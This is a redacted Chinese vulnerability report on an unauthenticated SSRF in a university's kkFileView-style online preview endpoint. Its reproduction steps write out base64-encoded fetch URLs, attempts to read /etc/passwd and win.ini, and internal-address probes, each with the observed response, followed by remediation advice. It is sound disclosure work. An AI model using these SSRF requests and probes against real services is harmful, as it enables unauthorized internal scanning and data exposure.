# 在线预览服务 `/preview/onlinePreview` 存在免鉴权 SSRF（脱敏版）

> 脱敏说明：真实域名已替换为 `*.example.edu.cn`，内网 IP 已替换为示例私网地址，内部编号已打码。接口路径与参数名保留用于复现与修复。

- 漏洞编号：`finding #REDACTED`
    
- 严重级别：低危
    
- 漏洞类型：SSRF（服务端请求伪造）
    
- 影响资产：`https://preview.example.edu.cn/preview/onlinePreview`（`endpoint #REDACTED`）
    

## 一、文字说明

`preview.example.edu.cn` 的在线预览端点 `/preview/onlinePreview`（kkFileView 风格）**未走 CAS 鉴权**，任意匿名访问者可直接调用。其 `url` 参数（base64 编码的目标地址）会让服务器端请求任意远程 URL，并按目标扩展名渲染预览、回显受支持类型（图片、纯文本等）的资源内容，构成服务端请求伪造（SSRF）。

诚实边界：

- **已确认**：服务器可被诱导请求任意远程 URL，且对受支持扩展名的资源回显内容（取数 SSRF）。
    
- **未成功**：`file://` 本地文件读取被 trusted-directory 检查（「未授信的目录」）拦截，未读到本地文件。
    
- **未能证实**：内网可达性 oracle 很弱——内网/无扩展名目标与普通取数失败统一返回 500，无法区分，未证实内网数据泄露。

## 二、影响与危害

- 攻击者可以**服务器身份**发起任意 HTTP/HTTPS 请求，用于内网探测、绕过网络边界访问后端资源；
    
- 对受支持扩展名（`.txt`/图片/文档等）的资源可**回显内容**，造成远程/潜在内网资源内容泄露；
    
- 由于免鉴权，无需任何凭据即可利用。

## 三、相关 URL

|用途|URL|
|---|---|
|漏洞接口|`https://preview.example.edu.cn/preview/onlinePreview?url=<base64(url)>`|
|无参（确认免鉴权）|`https://preview.example.edu.cn/preview/onlinePreview`|

`url` 参数为**目标地址的 base64 编码**。

## 四、涉及账号密码

**无。** 接口免鉴权（未走 CAS），利用无需任何账号、密码或令牌。

## 五、利用过程（复现步骤）

1. 确认免鉴权：
    
```
    GET https://preview.example.edu.cn/preview/onlinePreview
    → 200，返回 kkFileView「预览源文件来自未授信的目录，请停止访问」sorry 页（未走 CAS）
```
    
2. 确认 SSRF 取数并回显（以自身站点资源为例）：
    
```
    url = base64("http://preview.example.edu.cn/favicon.ico")
    → 200，<title>图片预览</title>，服务端取回图片并渲染
    url = base64("http://preview.example.edu.cn/robots.txt")
    → 200，<title>普通文本预览</title>，远程文本内容 base64 内嵌于 #textData，可解码回显
```
    
3. 本地文件读取（否定）：
    
```
    url = base64("file:///etc/passwd")   → 200 抱歉页「预览源文件来自未授信的目录」，无内容
    url = base64("file:///C:/Windows/win.ini") → 同上，无内容
```
    
4. 内网探测（弱 oracle，未能证实）：
    
```
    http://127.0.0.1/  http://localhost/  http://127.0.0.1:8080/  http://127.0.0.1:8848/
    http://192.168.1.10/  http://cas.example.edu.cn/  http://preview.example.edu.cn/preview/
    → 均 500，返回统一 Spring Boot JSON 错误
      {"timestamp":...,"status":500,"error":"Internal Server Error","path":"/preview/onlinePreview"}
      与真正的取数失败无法区分；无扩展名的 URL 往往直接 500（文件类型判断依赖 URL 扩展名）
```
    

全程只读，未上传/篡改/删除任何文件，未批量操作。

## 六、证明（截图 / 文本证据）

- **证明截图：无。** 本次验证通过命令行 `curl` 发起无害只读请求完成，未留存图形化截图。
    
- 文本证据：
    
    - `favicon.ico` → `HTTP/1.1 200 OK`，`<title>图片预览</title>`（服务端取回图片）
        
    - `robots.txt` → `HTTP 200 len=5203`，`<title>普通文本预览</title>`（内容在 `#textData`）
        
    - `file:///etc/passwd` → 200 抱歉页，无内容（本地文件读取被拦截）
        
    - `127.0.0.1 / localhost / :8080 / :8848 / 192.168.1.10` → 统一 500 JSON 错误

## 七、修复建议

1. 对 `/preview/onlinePreview` 增加鉴权（纳入 CAS / 会话校验），禁止匿名访问；
    
2. 对 `url` 参数做严格白名单/协议限制（仅允许业务必需的协议与可信域名），拒绝 `file://`、`gopher://`、内网地址（127.0.0.1、私网段、169.254 等）；
    
3. 解析目标主机并做 DNS rebinding 防护，请求前校验解析后的 IP 不在内网；
    
4. 禁止跟随不安全重定向；
    
5. 升级 kkFileView 到修复版本并收紧 trusted-directory 配置；
    
6. 对预览服务出网做网络层限制与访问审计。
